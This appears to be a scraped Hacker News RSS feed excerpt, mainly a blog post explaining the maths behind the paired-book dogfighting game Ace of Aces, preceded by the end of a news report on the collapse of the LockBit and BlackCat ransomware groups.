<p>“The affiliates still have this data, and they’re mad they didn’t receive this money, Smilyanets <a href="https://apple.news/A15zH2UVNQpaKt1gwZ8QRCQ" target="_blank" rel="noopener">told Wired.com</a>. “It’s a good lesson for everyone. You cannot trust criminals; their word is worth nothing.”</p>
<p><img decoding="async" loading="lazy" src="https://krebsonsecurity.com/wp-content/uploads/2024/03/dstweet.png" alt="" width="583" height="569"></p>
<p>BlackCat’s apparent demise comes closely on the heels of the implosion of another major ransomware group — <strong>LockBit</strong>, a ransomware gang estimated to have extorted over $120 million in payments from more than 2,000 victims worldwide. On Feb. 20, LockBit’s website <a href="https://krebsonsecurity.com/2024/02/feds-seize-lockbit-ransomware-websites-offer-decryption-tools-troll-affiliates/" target="_blank" rel="noopener">was seized by the FBI</a> and the U.K.’s National Crime Agency (NCA) following a months-long infiltration of the group.</p>
<p>LockBit also tried to restore its reputation on the cybercrime forums by resurrecting itself at a new darknet website, and by threatening to release data from a number of major companies that were hacked by the group in the weeks and days prior to the FBI takedown.</p>
<p>But LockBit appears to have since lost any credibility the group may have once had. After a much-promoted attack on the government of Fulton County, Ga., for example, LockBit threatened to release Fulton County’s data unless paid a ransom by Feb. 29. But when Feb. 29 rolled around, LockBit <a href="https://krebsonsecurity.com/2024/02/fulton-county-security-experts-call-lockbits-bluff/" target="_blank" rel="noopener">simply deleted the entry for Fulton County from its site</a>, along with those of several financial organizations that had previously been extorted by the group.</p>
<p>Fulton County held a press conference to say that it had not paid a ransom to LockBit, nor had anyone done so on their behalf, and that they were just as mystified as everyone else as to why LockBit never followed through on its threat to publish the county’s data. Experts told KrebsOnSecurity LockBit likely balked because it was bluffing, and that the FBI likely relieved them of that data in their raid.</p>
<p>Smilyanets’ comments are driven home in revelations first published last month by Recorded Future, which <a href="https://therecord.media/lockbit-lied-about-deleting-exfiltrated-data-after-ransom-payments" target="_blank" rel="noopener">quoted</a> an NCA official as saying LockBit never deleted the data after being paid a ransom, even though that is the only reason many of its victims paid.</p>
<p>“If we do not give you decrypters, or we do not delete your data after payment, then nobody will pay us in the future,” LockBit’s extortion notes typically read.</p>
<p>Hopefully, more companies are starting to get the memo that <a href="https://krebsonsecurity.com/2020/11/why-paying-to-delete-stolen-data-is-bonkers/" target="_blank" rel="noopener">paying cybercrooks to delete stolen data</a> is a losing proposition all around.</p>
											</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[European court favors strong encryption, calling it key to privacy rights (248 pts)]]></title>
            <link>https://www.washingtonpost.com/technology/2024/03/05/encryption-eu-human-rights-privacy-ruling/</link>
            <guid>39609846</guid>
            <pubDate>Tue, 05 Mar 2024 22:16:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.washingtonpost.com/technology/2024/03/05/encryption-eu-human-rights-privacy-ruling/">https://www.washingtonpost.com/technology/2024/03/05/encryption-eu-human-rights-privacy-ruling/</a>, See on <a href="https://news.ycombinator.com/item?id=39609846">Hacker News</a></p>
Couldn't get https://www.washingtonpost.com/technology/2024/03/05/encryption-eu-human-rights-privacy-ruling/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Ace of Aces: or, why you should Do Maths as a game designer (200 pts)]]></title>
            <link>https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/</link>
            <guid>39609528</guid>
            <pubDate>Tue, 05 Mar 2024 21:45:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/">https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/</a>, See on <a href="https://news.ycombinator.com/item?id=39609528">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				
<p>Every now and again you come across something that stretches your brain in a new direction. Last week I stumbled on a magic trick of a Choose Your Own Adventure: Al Leonardi’s Ace of Aces, a paper computer running a first-person shooter, programmed in 1980—eleven years before <a href="https://en.wikipedia.org/wiki/Wolfenstein_3D">Wolfenstein 3D</a>, the “first” first-person shooter.</p>



<h2>Wait what? A physical game can be a computer?</h2>



<p>There are of course, all sorts of early “computers” of various flavours that predate what we generally mean when we talk about computer programs:</p>



<ul>
<li>Jaquet Droz’s <a href="https://www.youtube.com/watch?v=laJX0txJc6M">The Writer</a>: a 1770 programmable automaton that could hand-write tweets</li>



<li>The Difference Engine (more about Ada Lovelace’s adventures in computing in <a href="https://www.vox.com/2015/4/21/11561702/sydney-paduas-new-comic-proves-ada-lovelace-was-not-a-fake-geek-girl">this delightful graphic novel</a>)</li>



<li><a href="https://en.wikipedia.org/wiki/Curta">The Curta</a> (or “maths hand grenade”)</li>



<li>And many mechanical <a href="https://en.wikipedia.org/wiki/Admiralty_Fire_Control_Table">fire control computers</a> from the beginning-of-the-end of the era in which <a href="https://paxsims.wordpress.com/2020/10/12/wrens-pioneer-synthetic-environment-training/">“computer” was a role filled by women</a>.</li>
</ul>



<p>All of these devices share a common limitation: they may be programable to a degree, but they solve a singular problem: the Writer can only hand-write a message stored in his main cam “memory”, the Difference Engine and Curta perform <em>particular</em> mathematical operations, fire control computers perform only that calculation…the device <em>is</em> the program, in the same way that Wolfenstein 3D <em>is</em> a first-person shooter, not the computer or operating system or programming language used to make it run. And when you start to think of programming in these terms, all sorts of interesting “computer programs” are there to be explored:</p>



<p>Computer programs are just algorithms—often big and quite complex—but at their heart, just a list of mathematical instructions:</p>



<ul>
<li>Add two numbers</li>



<li>Subtract two numbers</li>
</ul>



<p>…and from there all mathematics is possible… (seriously. That’s what a slide rule does: “multiplication” is just adding the value several times.)</p>



<p>You can encode these operations in a (real) computer program by writing code. You can encode them mechanically. One of my favourite YouTubes of all time is the 1950s US Navy educational film explaining how mechanical computers perform maths:</p>



<figure><p><span><iframe width="630" height="355" src="https://www.youtube.com/embed/gwf5mAlI7Ug?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation allow-popups-to-escape-sandbox"></iframe></span>
</p></figure>



<p>And if you know a little about analogue electronics, you know that <a href="https://www.youtube.com/watch?v=J62AVFREwxQ">basic electrical circuits</a> just do maths, and from there <a href="https://www.youtube.com/watch?v=QZwneRb-zqA">you can create all the complex logic</a> of analogue and digital computing. Which is a long way of saying: if you can say something with maths, you can construct an algorithm that computes it.</p>



<p>Board games are doing this all the time and we just don’t think about it so much:</p>



<p>Sometimes the player performs operations to physically compute for the game: rolling a dice for a random number.</p>



<p>Sometimes the state of the board <em>is</em> the computation. You see this kind of trick used to modify player abilities directly inside game mechanics: when you “score” with pieces otherwise used to play the game, removing them from the board to track your score imposes a mechanical disadvantage: in the 2-player game <a href="https://boardgamegeek.com/boardgame/7854/yinsh">Yinsh</a>, you move one of your three rings to construct 5-in-a-row patterns—but when you connect five, one of your rings comes off the board to signal this, reducing the options you have to connect five again.</p>



<p>From a particular frame of reference, this is an algorithm encoding some pretty sophisticated maths.</p>



<p>Sometimes the computation is encoded in a look-up table. These can be simple conversion factors, like the 4:1 ratio to trade resources with the bank in Catan, or fairly complex range tables for weapon class vs armour class used in the <a href="http://www.wrg.me.uk/wrg-me.html">Wargames Research Group</a> games.</p>



<p>Choose Your Own Adventures are essentially a look-up table: after each page the player is presented with a list of options and the page to turn to if you choose that option—a look-up table that converts their choice into the next page number.</p>



<h2>What’s so interesting about Ace of Aces?</h2>



<p>First: what <em>is</em> Ace of Aces? It’s a two-player World War One dogfighting game. One of you is the Red Baron, one of you is <s>Snoopy</s> Biggles, and you attempt to line the other up in your sights for some dakka dakka dakka. So far so <a href="https://boardgamegeek.com/boardgame/1711/richthofens-war">several other board games</a>. What sets Ace of Aces apart is the ingenious interface: you play with a pair of picture books, one for the German pilot, one for the Allied pilot. Each page of the book shows you the view of your enemy given your current position.</p>



<p>Each page has a list of manoeuvres you can choose from and the page to turn to that “performs” the manoeuvre. I’ve put “performs” in quotes, but as we’ll see, the look-up table actually has this maths encoded into the page numbers, it’s some sneaky-clever design.</p>



<p>Your opponent tells you the page number for their move and you turn to that page. Then you look up your move in the look-up table you find there, and—by the Power Of Awesomeness it will take you to <em>the same page number</em> as your opponent gets to by turning to the page for your move and then looking up their move.</p>



<p>The entire game is encoded into these paired books:</p>



<ul>
<li>No matter what manoeuvres you and your opponent pick, you always end up on the same page number.</li>



<li>For any given page number, the relative positions of the two planes are the same in both books. One shows the view from the German aircraft, the other shows the view looking back the other way.</li>
</ul>



<figure><p><img id="36909" src="https://paxsims.files.wordpress.com/2024/03/a170.jpg" alt="" width="600" height="485"><img id="36910" src="https://paxsims.files.wordpress.com/2024/03/g170.jpg" alt="" width="600" height="449"></p><figcaption>Both players are on page 170. The Allied player sends the German player to page 64, the German player sends the Allied player to page 54:</figcaption></figure>



<figure><p><img id="36915" src="https://paxsims.files.wordpress.com/2024/03/a54.jpg" alt="" width="600" height="466"><img id="36916" src="https://paxsims.files.wordpress.com/2024/03/g64.jpg" alt="" width="600" height="472"></p><figcaption>…where we see the Allied player side-slips left, and the German player makes a stall-turn right…</figcaption></figure>



<figure><p><img id="36912" src="https://paxsims.files.wordpress.com/2024/03/a15.jpg" alt="" width="600" height="470"><img id="36913" src="https://paxsims.files.wordpress.com/2024/03/g15.jpg" alt="" width="600" height="473"></p><figcaption>Both players end up on page 15</figcaption></figure>



<p>There’s a lot of interesting stuff going on here! But before we dive into how the magic trick works (maybe your maths brain has an inkling of what may be involved ?), let’s take a minute to appreciate:</p>



<p>The sheer simplicity of play:</p>



<ul>
<li>You look at a picture of the game state</li>



<li>You choose a move</li>



<li>You and your opponent turn to the page number for each-other’s moves</li>



<li>You look up your move on that intermediate page, and turn to that page number which is the new game state</li>



<li>Repeat.</li>
</ul>



<p>There are no dice, no counters, no moving parts. You don’t even need to be in the same place as your opponent, you just need to be able to give each other page numbers. It takes less than a minute to learn how to play—even though you now have full control over a pretty sophisticated flying machine—and creates quick-fire play that makes total sense in the seat-of-your-pants early aviation era.</p>



<p>Error correction is effortlessly built in: if you don’t end up on matching page numbers, one of you goofed.</p>



<p>The framing is brilliant. The first-person view from the cockpit is <em>so</em> immersive, and it’s key to the simplicity of play. The state of the game and manoeuvre options (drawn as pictures of the manoeuvre) are intuitive—but that rare kind of intuitive that makes sense to subject matter experts who know how to fly a plane for real, and casual gamers who know <em>nothing</em> about flying or WW1.</p>



<p>One of the reasons the game works so well is the lever you’re given to pull is perfect. The game moves at the speed of your thoughts: you don’t have to pull the yoke and throttle and set the flaps correctly, you can’t “fail” to perform your action—the <em>game</em> is that your opponent isn’t sitting still while you do it.</p>



<p>You are in full control of this aircraft: it’s not like you pick “do you want to break left or right?” and then sit back and watch a cut scene of the dogfight where the next dozen decisions are made for you. There’s no system to beat your opponent at beating—and that is part of what makes this game endlessly re-playable.</p>



<figure><p><span><iframe width="630" height="355" src="https://www.youtube.com/embed/UF8BF7_ywkI?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation allow-popups-to-escape-sandbox"></iframe></span>
</p></figure>



<p>When I talk about this game as a paper computer, it’s because you’re playing something much closer to a genuine flightsim than a board or card game.</p>



<p>And it turns out that the framing is the secret sauce to everything about this game.</p>



<h2>It’s all about perspectives.</h2>



<p>One of the big lessons to learn in programming for game design is that the visuals and the game state are not the same thing—the visuals at the front end isn’t necessarily driving how the back end works. Tetris has “falling” blocks but the game is not about gravity and “falling”, that’s just a visual representation of a time limit. (<a href="https://stabyourself.net/nottetris2/">Not Tetris</a> illustrates this point perfectly.)</p>



<p>Ace of Aces is doing something sneaky-clever in the background:</p>



<p>First of all, the game is secretly a hex-based game.</p>



<p>But Kit! You said this game was <em>not</em> like the other hex-based WW1 dogfighting games. And that’s true for the player 😉 and also true for the game, because yes, the game is using hexes, but not like Richtofen’s War or any other hex-based wargame.</p>



<p>In these games, the map is made of hexes. You have hex-based movement relative to a fixed point of reference—the topology of the map. The movement is absolute—the value itself matters.</p>



<p>Ace of Aces is using hexes, but there is no map. Movement is relative to your current position. The absolute value is irrelevant, the change in the value between one turn and the next is all that matters. This works because the game is first-person: the only thing that matters is where is the enemy relative to your current position. Not only <em>is</em> this the first-person perspective, but it’s what makes the system manageable in an analogue format—the first-person view of every possible relative position of the German aircraft from the Allied aircraft is 222…almost exactly the number of pages in the paired books (page 223 is the “ohnoes! You lost them” page).</p>



<p>If the German plane is dead ahead of you, it looks the same regardless of how you got here. If there were a map, the view of the aircraft would be the same whether the two aircraft where head-to-head over the field or the stand of trees or the country lane between them. If there was a map and the map actually mattered, the first-person perspective would require ~1,400 pages <em>per map hex</em> to show the appropriate landscape under both planes (223 unique relative positions of Allied and German aircraft, times the six unique orientations of the perspective aircraft relative to the map hex).</p>



<p>This trick of stationary player, moving world, is another reason why calling Ace of Aces a program feels right: this is how computer games work. Your monitor is a stationary window onto the game world that is moving relative to you. It’s an easy trick for the computer to pat its head and rub its stomach and have the dogfight happen in relative space—hexes that aren’t map hexes—while simultaneously moving the map beneath you as a separate calculation.</p>



<p>This relative frame of reference is also going to be familiar to anyone who has done old-school air-to-air lethality analysis: the endgame of a missile versus an aircraft doesn’t care about where they are in absolute space, just relative to each other—and in fact you especially <em>don’t</em> care about any permutation of endgame geometry where the missile isn’t on an intercept course with the aircraft (duh, it’s going to miss), so it was common to separate out the different computations of “do they intercept?” and “if they intercept, what’s the damage?”, the latter being stuffed into a lookup table that gives you the lethality that your six-degrees-of-freedom flightsim can call on. The frame of reference called <a href="https://eprints.soton.ac.uk/23361/1/pate_05.pdf">GW372</a> is explicitly relative to the aircraft (or missile) being shot at. So, yes, Ace of Aces is a FORTRAN flightsim.</p>



<p>The other sneaky trick that Ace of Aces is doing comes back to the reciprocal perspectives again, but from another angle. Hold onto your hats, here comes the maths!</p>



<p>A <a href="https://www.youtube.com/watch?v=kYB8IZa5AuE">Transformation Matrix</a> is a magic number you can multiply by, to get from one position and rotation to another. It’s sort of like converting between degrees Celsius and Fahrenheit, or meters and kilometres—the transformation matrix is the “conversion factor” to teleport from a given position and rotation in the world to another.</p>



<p>Why that’s important is the magical property they have when our world position is not absolute, but relative:</p>



<p>Let’s say the Allied aircraft is at <em>A</em>, and the German aircraft is a <em>G</em></p>



<p>And we say the transformation matrix of the Allied aircraft’s manoeuvre is <em>a</em></p>



<p>And the transformation matrix of the German aircraft’s manoeuvre is <em>g</em></p>



<p>Then <em>Aga = Gag</em></p>



<p>That is, if we apply the enemy’s manoeuvre to ourselves, then do our manoeuvre, we end up at the correct position and rotation relative to the other aircraft, given our respective starting points and manoeuvres. And because the books are paired, that’s also the same page number: the books show the two aircraft in the same relative positions on any given page, just one book shows the view of that is from the German perspective and the other book is from the Allied perspective.</p>



<p>The clue to this is in that intermediate page: if you pay attention to the pictures, the page your opponent sends you to is literally showing you their aircraft’s movement relative to your current position, before you’ve taken your move.</p>



<p>You can tell because of another concept called the Identity Matrix: the transformation matrix that does no movement and no rotation—the “multiply by 1” or “add 0” equivalent. Because we’re not using the hexes for a map—because it’s relative movement, not absolute—there is a “no movement, no rotation” option, and if your opponent chooses it, they send you to…the page you’re currently on as the intermediate page, because no relative change in position or rotation! Remember the intermediate page shows you their movement relative to you while you’re not moving. And if you look up the Identity manoeuvre on any page it always says the page number that you’re currently on.</p>



<h2>Ok but how on earth do you make a book that does this ?!?!</h2>



<p>You can read the <a href="https://patents.google.com/patent/US4378118A/en">fairly obtuse patent here</a>. It’s not particularly easy to parse, because of a lack of good diagrams and the generalisation to all possible interpretations of the IP, but I managed to unpick how it works and how to make my own paired-books. Hats off to Leonardi who did this (literally) with <a href="https://ludology.libsyn.com/ludology-257-all-about-that-ace">string, transparencies, and a banda machine</a>. I ended up creating the tools to create my own paired-books as the by-product of trying to visualise the patent description.</p>



<p>The game takes place on a hex grid. <a href="https://h3geo.org/docs/core-library/coordsystems/">Coordinate systems for hex grids</a> are…interesting…but in this case we don’t need an x or y axis, we just need a notation system for each cell of the grid, and the six possible orientations an aircraft can have in any given cell. Leonardi’s system puts hex 0 at the centre, and winds the cell numbers clockwise from the top left. The orientations take a letter, and also wind clockwise from the top left.</p>



<p>Secretly, you start every turn at the centre of this grid in position 0A, the origin in this notation.</p>



<figure><a href="https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png"><img data-attachment-id="36919" data-permalink="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/us4378118-drawings-page-5/" data-orig-file="https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png" data-orig-size="1222,988" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="us4378118-drawings-page-5" data-image-description="" data-image-caption="" data-medium-file="https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png?w=300" data-large-file="https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png?w=630" width="1024" height="827" src="https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png?w=1024" alt="Plot showing a hex grid with the hexes numbered 0 to 6, wound clockwise, and each face of each hex labeled A to F also wound clockwise." srcset="https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png?w=1024 1024w, https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png?w=150 150w, https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png?w=300 300w, https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png?w=768 768w, https://paxsims.files.wordpress.com/2024/03/us4378118-drawings-page-5.png 1222w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>



<p>The enemy aircraft can be in any position and rotation on the grid, giving you all possible relative positions and rotations to each other. They have some relative position and rotation to you. Meanwhile they see themselves from position 0A and see you at the reciprocal of that relative position. That can make your brain ache a little.</p>



<p>The first thing to do is construct a list of the reciprocal positions: if you move the Allied aircraft to any given position and rotation on the grid, taking its frame of reference with, which cell position and rotation of the Allied aircraft’s grid is now at the “origin”. This is the kind of thing my brain finds extremely slippery, so I drew a picture—or, rather, I constructed the grid in Unity, wrote some code that let me set the position and rotation of the Allied aircraft, and asked Unity “hey, what cell number and letter is in that position now please?”</p>



<figure><a href="https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png"><img data-attachment-id="36924" data-permalink="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/transformation-matrix/" data-orig-file="https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png" data-orig-size="3829,2242" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="transformation-matrix" data-image-description="" data-image-caption="" data-medium-file="https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png?w=300" data-large-file="https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png?w=630" width="1024" height="599" src="https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png?w=1024" alt="Screenshot of the above hex grid imposed on two vehicles with different positions and orientations." srcset="https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png?w=1024 1024w, https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png?w=2046 2046w, https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png?w=150 150w, https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png?w=300 300w, https://paxsims.files.wordpress.com/2024/03/transformation-matrix.png?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>(Well spotted: these are not aircraft 😉 more on that later.)</figcaption></figure>



<p>I did this initially so I could follow the example in the patent and set the Allied player to the position in the worked example and confirm what the obtuse language was even talking about. But, having written a script that lets me set the values by hand, it was a short step to writing a loop to iterate through all of them to read the result and write out the table to Excel. What you end up with is a somewhat symmetric result: when the enemy is in front of me, I am behind them. When they are to my east, I am to their west.</p>



<p>This is the key to determining the page number for any given relative position: you go through the list of all possible positions and rotations and assign each a unique page number for the Allied book. For each page in the Allied book, the <em>reciprocal</em> view in the German book shares that page number—so position 0B in the Allied book shares a page number with position 0F in the German book. This is easy to conceptualise if you iterate through the German positions and rotations in the same order as the Allied ones, but instead of copying the page number directly, you look up the Allied page number for the reciprocal position.</p>



<p>This has created you a lookup table for the correct page number for Allied and German relative positions on the hex grid. You can put it aside while we change gear to think about manoeuvring.</p>



<p>We know that the transformation matrices we need work independent of the other player, which is super-handy. It simplifies everything that follows to just thinking about one aircraft moving at a time.</p>



<p>How does a manoeuvre work ? You begin your turn at the origin. In purely mathematical terms, your available moves are to any other position and rotation on the grid, but in practical terms your aircraft is only so manoeuvrable. The <em>allowed</em> moves in Ace of Aces are:</p>



<figure><a href="https://paxsims.files.wordpress.com/2024/03/moves.jpg"><img data-attachment-id="36921" data-permalink="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/moves/" data-orig-file="https://paxsims.files.wordpress.com/2024/03/moves.jpg" data-orig-size="600,452" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="moves" data-image-description="" data-image-caption="" data-medium-file="https://paxsims.files.wordpress.com/2024/03/moves.jpg?w=300" data-large-file="https://paxsims.files.wordpress.com/2024/03/moves.jpg?w=600" width="600" height="452" src="https://paxsims.files.wordpress.com/2024/03/moves.jpg?w=600" alt="Hex grid showing an aircraft and the hex position and direction destination for each of Ace of Ace's manoeuvre symbols." srcset="https://paxsims.files.wordpress.com/2024/03/moves.jpg 600w, https://paxsims.files.wordpress.com/2024/03/moves.jpg?w=150 150w, https://paxsims.files.wordpress.com/2024/03/moves.jpg?w=300 300w" sizes="(max-width: 600px) 100vw, 600px"></a></figure>



<p>This is how the manoeuvre symbols match the hex grid movement. You’ll notice it’s not entirely symmetric, because the torque of a rotary engine makes it much easier to turn and spin with the propeller, not against it. You can also tune “allowed” moves to match the capability of a particular aircraft (and that’s why there is a whole series of these books that you can use interchangeably in any Allied-German pair: the underlying reciprocal page numbers, hex grid and movement are the same, but some planes don’t have access to <em>all</em> the manoeuvres).</p>



<p>A particular manoeuvre will change your position and rotation <em>by</em> the same amount regardless of your starting position and rotation—the manoeuvre is a transformation matrix—and the Identity manoeuvre, that has zero change in position and rotation, is the clue to what happens next:</p>



<p>The intermediate page number for any given manoeuvre—the one you tell to your enemy—is the page number that corresponds to your destination taking that move from 0A. That destination encodes the movement of your aircraft relative to the origin in a transformation matrix that can be applied to your enemy to make it the movement relative to their current position and rotation. …if that makes your hair catch on fire, think about vectors and co-ordinates:</p>



<p>If you have a point (2, 4) that’s the same as having a vector—a line—that goes from position (0, 0) to position (2, 4). If I <em>add</em> another vector (3, 1) to this point, we’re taking the vector that goes from (0, 0) to (1, 3), moving it to put the (0, 0) at position (2, 4) and then drawing the line from (2, 4) to whatever position (2, 4) + (3, 1) is. The addition can happen in either order, we still end up at (5, 5).</p>



<figure><a href="https://paxsims.files.wordpress.com/2024/03/graph.png"><img data-attachment-id="36922" data-permalink="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/graph-2/" data-orig-file="https://paxsims.files.wordpress.com/2024/03/graph.png" data-orig-size="461,460" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="graph" data-image-description="" data-image-caption="" data-medium-file="https://paxsims.files.wordpress.com/2024/03/graph.png?w=300" data-large-file="https://paxsims.files.wordpress.com/2024/03/graph.png?w=461" loading="lazy" width="461" height="460" src="https://paxsims.files.wordpress.com/2024/03/graph.png?w=461" alt="Graph of the above vectors." srcset="https://paxsims.files.wordpress.com/2024/03/graph.png 461w, https://paxsims.files.wordpress.com/2024/03/graph.png?w=150 150w, https://paxsims.files.wordpress.com/2024/03/graph.png?w=300 300w" sizes="(max-width: 461px) 100vw, 461px"></a></figure>



<p>(This is literally the maths we’re doing to add an Allied aircraft manoeuvre to the German aircraft’s position. It is just 2D vectors, but because hex grid it’s <em>ugly</em>.)</p>



<p>What we need to do is construct a matrix of every possible position and rotation we could land at vs where the enemy could land at—this is easy to do in code by iterating through all combinations for each aircraft—and for each, reduce it to the corresponding unique situations in our first table. We only care about relative positions. This is what I mean when I say secretly the Allied aircraft starts every turn at 0A. That relative position is the intermediate page you’re going to send the enemy aircraft to, and you get the page number for it by looking it up in that first table.</p>



<p>What you end up with is this monster matrix of all possible intermediate destinations, and one strip of it is what you find at your intermediate destination: for a given actual manoeuvre your enemy chose, the row or column of your manoeuvres is the final destination for all the manoeuvres you could have chosen. If you go to the one for the manoeuvre you already told your enemy, then magically you both end up on the same page. Otherwise, the maths breaks, because you’re not applying the same transformation matrix to both aircraft.</p>



<p>Instead of <em>Aga = Gag</em></p>



<p>You’ll have <em>Agb =/= Gag</em></p>



<p>The page numbers won’t match because (in an absolute frame of reference) the Allied aircraft will be at 0A looking towards the German aircraft at (say) 5B, while the German aircraft will be at 9F looking towards the Allied aircraft at 0A. And if you both gave the other one manoeuvre and then performed a different one from your intermediate page, we’d have a situation where <em>Agb =/= Gah</em>.</p>



<p>In both these situations you get a view of the world (because that’s the nature of the book!) but it’s not reciprocal, which breaks everything about a relative frame of reference. Given this, isn’t it a brilliant idea to have the reciprocal positions have matching page numbers? The game contains its own <a href="https://www.youtube.com/watch?v=X8jsijhllIA">parity check</a>.</p>



<p>It would be entirely possible to make the paired-books where the relative positions don’t have matching page numbers, but you’d never know when the two hex positions were actually out of sync, you’d just be chasing your own tail with nonsense page turns.</p>



<p>This has made the manoeuvre table that’s common to both players. Leonardi did this by hand for all 222 permutations. Praise be for C#, which whips through all the combinations for me quicker than I can blink and writes them out to an Excel file.</p>



<p>This is all the possible moves; you can narrow it to only certain moves.</p>



<p>Certain permutations result in the two aircraft further apart than our little hex grid. These are the manoeuvres that will take you to that “ohnoes! You lost them” 223<sup>rd</sup> page. You’re out of range of the other aircraft.</p>



<figure><a href="https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png"><img data-attachment-id="36926" data-permalink="https://paxsims.wordpress.com/2024/03/02/ace-of-aces-or-why-you-should-do-maths-as-a-game-designer/lost-contact-in-red/" data-orig-file="https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png" data-orig-size="1261,830" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lost-contact-in-red" data-image-description="" data-image-caption="" data-medium-file="https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png?w=300" data-large-file="https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png?w=630" loading="lazy" width="1024" height="674" src="https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png?w=1024" alt="A very large matix with some cells coloured red." srcset="https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png?w=1024 1024w, https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png?w=150 150w, https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png?w=300 300w, https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png?w=768 768w, https://paxsims.files.wordpress.com/2024/03/lost-contact-in-red.png 1261w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>All possible moves for the Allied player across the top, German player down the side. Lost Contact at the red cells.</figcaption></figure>



